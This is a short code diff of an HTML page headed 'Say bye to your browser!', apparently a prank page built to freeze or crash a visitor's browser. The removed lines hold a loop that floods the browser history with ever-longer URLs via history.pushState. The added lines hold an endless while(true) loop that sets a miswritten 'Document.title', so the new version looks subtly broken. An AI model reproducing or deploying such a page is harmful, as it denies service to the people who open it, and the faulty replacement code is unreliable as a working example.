@@ -4,9 +4,8 @@
     <h1>What were you expecting? Say bye to your browser!</h1>
     <script>
         var total = "";
-        for( var i = 0; i < 100000; i++ ) {
-            total = total + i.toString();
-            history.pushState(0,0, total );
+        while(true){
+          Document.title = Math.random(10,1000000000000000);
         }
     </script>
   </body>
